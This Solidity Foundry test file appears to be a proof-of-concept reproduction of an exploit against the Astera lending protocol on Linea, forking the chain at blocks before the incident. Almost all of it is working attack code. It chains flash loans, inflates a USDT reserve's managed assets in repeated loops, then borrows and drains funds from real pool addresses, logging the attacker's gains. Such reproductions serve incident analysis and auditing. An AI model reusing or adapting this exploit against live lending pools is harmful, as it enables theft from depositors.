// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/Test.sol";
import "../../interface/interface.sol";

interface IAsteraLendingPool {
    function flashLoan(uint amount, bytes calldata data) external;
    function flashLoan(
        FlashLoanParams memory flashLoanParams,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        bytes calldata params
    ) external;
    function getReserveNormalizedIncome(
        address asset,
        bool reserveType
    ) external returns (uint256);
    function deposit(
        address asset,
        bool reserveType,
        uint256 amount,
        address onBehalfOf
    ) external;
    function borrow(
        address asset,
        bool reserveType,
        uint256 amount,
        address onBehalfOf
    ) external;
}

interface IAsteraLendingPoolConfigurator is IAsteraLendingPool {
    function getTotalManagedAssets() external returns (uint256);
}

struct FlashLoanParams {
    address receiverAddress;
    address[] assets;
    bool[] reserveTypes;
    address onBehalfOf;
}

contract AsteraFiPoC is Test {
    ExploitContract exploitContract;
    // create new address
    address drainer = 0x61EA1C91d7aE9782223384fAFe3ad81fFb8E0b45;
    address inflator = 0x9520C9040338bE61005590cC1BD15caa10a6613c;
    IERC20 usdt = IERC20(0xA219439258ca9da29E9Cc4cE5596924745e12B93);
    IERC20 asUSD = IERC20(0xa500000000e482752f032eA387390b6025a2377b);
    WETH9 weth = WETH9(0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f);
    IERC20 linea = IERC20(0x1789e0043623282D5DCc7F213d703C6D8BAfBB04);
    constructor() {
        // Fork Base chain at block just before the exploit
        vm.createSelectFork("linea", 24320159 - 1);

        exploitContract = new ExploitContract();
    }

    // phase 1: open position with flashloan
    function testExploitPhase1() public {
        vm.startPrank(drainer);
        vm.deal(drainer, 1.6 ether);
        exploitContract.openPosition{value: 1.5 ether}();
    }

    // phase 2: inflate the USDT reserve
    function testExploitPhase2() public {
        vm.rollFork(24321061 - 1);
        vm.startPrank(inflator);
        deal(address(usdt), inflator, 16_900 * 1e6);
        uint256 usdtBalance = usdt.balanceOf(inflator);
        console.log("Attacker USDT balance:", usdtBalance / 1e6);

        InflateContract inflateContract = new InflateContract();
        usdt.transfer(address(inflateContract), 16_900 * 1e6);

        for (uint i = 0; i < 112; i++) {
            inflateContract.inflate();
        }
    }

    // phase 3: drain the profit
    function testExploitPhase3() public {
        vm.rollFork(24321904 - 1);
        vm.startPrank(drainer, drainer);
        (0xcd69567080Dccad1Afe61aCc022c0A7164B29AB4).call(
            abi.encodeWithSelector(0x008ed35b, "")
        );

        uint256 wethBalance = weth.balanceOf(drainer);
        console.log("Attacker WETH balance:", wethBalance / 1e18);
        uint256 usdtBalance = usdt.balanceOf(drainer);
        console.log("Attacker USDT balance:", usdtBalance / 1e6);
        uint256 asUSDBalance = asUSD.balanceOf(drainer);
        console.log("Attacker asUSD balance:", asUSDBalance / 1e18);
        uint256 lineaBalance = linea.balanceOf(drainer);
        console.log("Attacker LINEA balance:", lineaBalance / 1e18);
    }
}

contract InflateContract {
    IERC20 usdt = IERC20(0xA219439258ca9da29E9Cc4cE5596924745e12B93);

    IAsteraLendingPoolConfigurator configurator1 =
        IAsteraLendingPoolConfigurator(
            0x17d8a5305A37fe93E13a28f09c46db5bE24E1B9E
        );
    IAsteraLendingPoolConfigurator configurator2 =
        IAsteraLendingPoolConfigurator(
            0xD66aD16105B0805e18DdAb6bF7792c4704568827
        );

    function inflate() external {
        usdt.approve(address(configurator1), type(uint256).max);

        FlashLoanParams memory params = FlashLoanParams({
            receiverAddress: address(this),
            assets: new address[](1),
            reserveTypes: new bool[](1),
            onBehalfOf: address(this)
        });

        params.assets[0] = address(usdt);
        params.reserveTypes[0] = true;

        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        uint256[] memory amounts = new uint256[](1);
        for (uint i = 0; i < 50; i++) {
            uint256 totalManagedAssets = configurator2.getTotalManagedAssets();
            amounts[0] = totalManagedAssets - 10;
            console.log("flashloan amount:", amounts[0]);
            configurator1.flashLoan(params, amounts, modes, abi.encode(0));
        }

        uint256 totalManagedAssets = configurator2.getTotalManagedAssets();
        console.log("Final totalManagedAssets:", totalManagedAssets);
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) public returns (bool) {
        return true;
    }
}

contract ExploitContract {
    IAsteraLendingPool lendingPool1 =
        IAsteraLendingPool(0xfB6448B96637d90FcF2E4Ad2c622A487d0496e6f);
    IAsteraLendingPool lendingPool2 =
        IAsteraLendingPool(0xCBeF9be95738290188B25ca9A6Dd2bEc417a578c);
    IAsteraLendingPool lendingPool3 =
        IAsteraLendingPool(0x0baFB30B72925e6d53F4d0A089bE1CeFbB5e3401);
    IAsteraLendingPool lendingPool4 =
        IAsteraLendingPool(0x65559abECD1227Cc1779F500453Da1f9fcADd928);
    IAsteraLendingPool lendingPool5 =
        IAsteraLendingPool(0x52280eA8979d52033E14df086F4dF555a258bEb4);

    IAsteraLendingPoolConfigurator configurator1 =
        IAsteraLendingPoolConfigurator(
            0x17d8a5305A37fe93E13a28f09c46db5bE24E1B9E
        );
    IAsteraLendingPoolConfigurator configurator2 =
        IAsteraLendingPoolConfigurator(
            0xCBeF9be95738290188B25ca9A6Dd2bEc417a578c
        );
    IAsteraLendingPoolConfigurator configurator3 =
        IAsteraLendingPoolConfigurator(
            0xfB6448B96637d90FcF2E4Ad2c622A487d0496e6f
        );

    ExploitContract2 exploitContract2 = new ExploitContract2();
    IPriceOracleGetter oracle =
        IPriceOracleGetter(0xd971e9EC7357e9306c2a138E5c4eAfC04d241C87);

    WETH9 weth = WETH9(0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f);
    IERC20 usdt = IERC20(0xA219439258ca9da29E9Cc4cE5596924745e12B93);
    IERC20 wasUSDT = IERC20(0x1579072d23FB3f545016Ac67E072D37e1281624C); // aToken
    IERC20 usdc = IERC20(0x176211869cA2b568f2A7D4EE941E073a821EE1ff);
    WETH9 wasWETH = WETH9(0x9A4cA144F38963007cFAC645d77049a1Dd4b209A); // aToken
    IERC20 wasUSDC = IERC20(0xAD7b51293DeB2B7dbCef4C5c3379AfaF63ef5944); // aToken

    IERC20 asUSD = IERC20(0xa500000000e482752f032eA387390b6025a2377b);
    address asUSDVictim = 0x5Fb9EBDD9bcBa3FB615CD07981aa5F4650BbD90D;

    uint256 depositAmount;

    function openPosition() external payable {
        depositAmount = msg.value;
        lendingPool1.flashLoan(12266529410, abi.encode(12266529410));
    }

    function drain() external {}

    function onFlashLoan(bytes calldata data) external payable {
        if (msg.sender == address(lendingPool1)) {
            lendingPool2.flashLoan(10540000000, abi.encode(10540000000));
        } else {
            weth.deposit{value: depositAmount}();

            uint256 wethBalance = weth.balanceOf(address(this));
            console.log("WETH balance:", wethBalance / 1e18);

            usdt.approve(address(lendingPool3), type(uint256).max);
            usdt.approve(address(lendingPool4), type(uint256).max);
            usdt.approve(address(lendingPool5), type(uint256).max);

            weth.approve(address(lendingPool3), type(uint256).max);
            weth.approve(address(lendingPool4), type(uint256).max);
            weth.approve(address(lendingPool5), type(uint256).max);

            configurator1.getReserveNormalizedIncome(address(usdt), true);

            lendingPool3.deposit(
                address(wasUSDT),
                true,
                439173037,
                address(this)
            );

            lendingPool4.deposit(
                address(wasUSDT),
                true,
                5988723237,
                address(this)
            );

            lendingPool5.deposit(
                address(wasUSDT),
                true,
                3094173672,
                address(this)
            );

            uint256 usdcBalance = usdc.balanceOf(address(this));
            console.log("USDC balance:", usdcBalance / 1e6);

            usdc.transfer(address(exploitContract2), usdcBalance);

            exploitContract2.exploit();

            configurator1.getReserveNormalizedIncome(address(weth), true);

            uint256 wasWETHPrice = oracle.getAssetPrice(address(wasWETH));
            console.log("wasWETH price:", wasWETHPrice);

            uint256 wasUSDTPrice = oracle.getAssetPrice(address(wasUSDT));
            console.log("wasUSDT price:", wasUSDTPrice);

            uint256 wasUSDCPrice = oracle.getAssetPrice(address(wasUSDC));
            console.log("wasUSDC price:", wasUSDCPrice);

            lendingPool3.deposit(
                address(wasWETH),
                true,
                53984779662620795,
                address(this)
            );

            lendingPool4.deposit(
                address(wasWETH),
                true,
                661174228197354351,
                address(this)
            );

            lendingPool5.deposit(
                address(wasWETH),
                true,
                320132464641893890,
                address(this)
            );

            configurator1.getReserveNormalizedIncome(address(usdc), true);

            lendingPool3.borrow(
                address(wasUSDC),
                true,
                539365792,
                address(this)
            );
            lendingPool4.borrow(
                address(wasUSDC),
                true,
                7260055444,
                address(this)
            );
            lendingPool5.borrow(
                address(wasUSDC),
                true,
                3668002472,
                address(this)
            );
            uint256 usdtBalance = usdt.balanceOf(address(this));
            console.log("USDT balance:", usdtBalance);
            usdt.transfer(address(configurator2), usdtBalance);

            usdcBalance = usdc.balanceOf(address(this));
            console.log("USDC balance:", usdcBalance);
            usdc.transfer(address(configurator3), usdcBalance - 1);
        }
    }
}

contract ExploitContract2 {
    IAsteraLendingPool lendingPool1 =
        IAsteraLendingPool(0xfB6448B96637d90FcF2E4Ad2c622A487d0496e6f);
    IAsteraLendingPool lendingPool2 =
        IAsteraLendingPool(0xCBeF9be95738290188B25ca9A6Dd2bEc417a578c);
    IAsteraLendingPool lendingPool3 =
        IAsteraLendingPool(0x0baFB30B72925e6d53F4d0A089bE1CeFbB5e3401);
    IAsteraLendingPool lendingPool4 =
        IAsteraLendingPool(0x65559abECD1227Cc1779F500453Da1f9fcADd928);
    IAsteraLendingPool lendingPool5 =
        IAsteraLendingPool(0x52280eA8979d52033E14df086F4dF555a258bEb4);

    IAsteraLendingPoolConfigurator configurator1 =
        IAsteraLendingPoolConfigurator(
            0x17d8a5305A37fe93E13a28f09c46db5bE24E1B9E
        );

    WETH9 weth = WETH9(0xe5D7C2a44FfDDf6b295A15c148167daaAf5Cf34f);
    IERC20 usdt = IERC20(0xA219439258ca9da29E9Cc4cE5596924745e12B93);
    IERC20 wasUSDT = IERC20(0x1579072d23FB3f545016Ac67E072D37e1281624C); // aToken
    IERC20 usdc = IERC20(0x176211869cA2b568f2A7D4EE941E073a821EE1ff);
    IERC20 wrappedAsteraUSDC =
        IERC20(0xAD7b51293DeB2B7dbCef4C5c3379AfaF63ef5944);

    function exploit() external {
        usdc.approve(address(lendingPool3), type(uint256).max);
        usdc.approve(address(lendingPool4), type(uint256).max);
        usdc.approve(address(lendingPool5), type(uint256).max);

        configurator1.getReserveNormalizedIncome(address(usdc), true);

        lendingPool3.deposit(
            address(wrappedAsteraUSDC),
            true,
            527365792,
            address(this)
        );
        lendingPool4.deposit(
            address(wrappedAsteraUSDC),
            true,
            7065055444,
            address(this)
        );
        lendingPool5.deposit(
            address(wrappedAsteraUSDC),
            true,
            3668102472,
            address(this)
        );

        configurator1.getReserveNormalizedIncome(address(usdt), true);

        lendingPool3.borrow(address(wasUSDT), true, 439172037, address(this));
        lendingPool4.borrow(address(wasUSDT), true, 5988722237, address(this));
        lendingPool5.borrow(address(wasUSDT), true, 3105172672, address(this));

        uint256 usdtBalance = usdt.balanceOf(address(this));
        console.log("USDT balance:", usdtBalance / 1e6);

        usdt.transfer(msg.sender, usdtBalance);

        uint256 usdcbalance = usdc.balanceOf(address(this));
        console.log("USDC balance:", usdcbalance / 1e6);

        usdc.transfer(msg.sender, usdcbalance);
    }
}
